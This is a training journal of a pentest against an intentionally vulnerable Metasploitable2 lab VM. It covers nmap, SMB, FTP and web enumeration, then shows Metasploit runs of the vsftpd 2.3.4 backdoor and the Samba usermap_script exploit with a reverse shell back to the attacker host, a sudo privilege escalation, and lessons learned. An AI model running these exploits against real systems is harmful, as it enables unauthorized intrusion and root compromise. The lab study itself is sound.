## Day 001 – 2026-04-04

**Focus:** Full attack chain — local Linux VM from zero to root
**Environment:** Kali Linux 2024.1 (attacker: 192.168.56.102), Metasploitable2 (target: 192.168.56.101)

---

## Phase 1: Reconnaissance

```bash
# Confirm host is up
ping -c 1 192.168.56.101

# Network discovery
sudo nmap -sn 192.168.56.0/24
```

**Output:** Target is live.

## Phase 2: Enumeration

```bash
# Full port scan with service detection and default scripts
sudo nmap -sC -sV -oA metasploitable_scan 192.168.56.101

# Enumerate SMB
smbclient -L //192.168.56.101 -N
enum4linux 192.168.56.101

# Enumerate FTP
ftp 192.168.56.101
# Try anonymous login
# Username: anonymous  Password: (blank)

# Enumerate web server
gobuster dir -u http://192.168.56.101 \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -t 50

nikto -h http://192.168.56.101
```

**Key Findings:**
```
PORT     SERVICE    VERSION
21/tcp   ftp        vsftpd 2.3.4           ← known backdoor
22/tcp   ssh        OpenSSH 4.7p1
23/tcp   telnet     Linux telnetd          ← plaintext, no encryption
80/tcp   http       Apache 2.2.8
139/tcp  smb        Samba 3.0.20           ← known vulnerability (CVE-2007-2447)
3306/tcp mysql      MySQL 5.0.51a          ← check for no-password root
8180/tcp http       Apache Tomcat

FTP: Anonymous login ALLOWED → directory listing shows nothing interesting
SMB: Shares visible — IPC$, ADMIN$, tmp (writable!)
Web: /phpMyAdmin, /tikiwiki, /twiki, /dav found
```

## Phase 3: Exploitation

**Attack vector chosen: vsftpd 2.3.4 backdoor**

```bash
msfconsole

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
set PAYLOAD cmd/unix/interact
run
```

**Result:**
```
[+] Backdoor service has been spawned, handling...
[+] UID: uid=0(root) gid=0(root)
[*] Command shell session 1 opened
```

Initial foothold obtained — directly as root (this was too easy for a realistic target).

**Alternative exploited (Samba):**
```bash
use exploit/multi/samba/usermap_script
set RHOSTS 192.168.56.101
set PAYLOAD cmd/unix/reverse
set LHOST 192.168.56.102
run
```

```
[*] Started reverse TCP handler on 192.168.56.102:4444
[*] Command shell session 2 opened
$ id
uid=0(root) gid=0(root) groups=0(root)
```

Two separate root shells via two different vulnerabilities.

## Phase 4: Privilege Escalation

*Both exploits gave us root directly on Metasploitable2. On a real target, we'd start with a low-privilege user.*

**Simulating a low-priv start:**
```bash
# Downgrade to regular user to practice escalation
su msfadmin  # default Metasploitable2 account

# Enumerate SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Check sudo rights
sudo -l
# Output: User msfadmin may run the following commands:
#         (ALL) ALL  ← can run everything as root with sudo!

# Escalate via sudo su
sudo su
# Password: msfadmin
id
# uid=0(root)
```

## Mistakes Made

1. **Jumped straight to Metasploit without finishing enumeration** — missed the Tomcat manager endpoint which could have been another vector. Always finish enumeration before exploiting.
2. **Didn't document commands as I ran them** — had to reconstruct the timeline afterward. Real pentest = document everything in real time.
3. **Ran `find / -name "*.bak"` without `2>/dev/null`** — flooded terminal with permission errors.

---

## What I Learned

- **Enumeration is everything** — I had 3+ viable exploit paths. In a real engagement, you'd document all of them and choose the least disruptive.
- **`sudo -l` is always the first privesc check** after getting a low-priv shell — if you can run anything as root, game over.
- **Metasploitable2 is intentionally broken** — it's an excellent training ground but not representative of hardened targets. Real systems require more patience.
- **Post-exploitation documentation** matters as much as exploitation — a pentester's value is in the report, not just getting root.
- Attack path: Recon → Enum → Exploit → PrivEsc → Post → Report. This is the pentesting methodology.
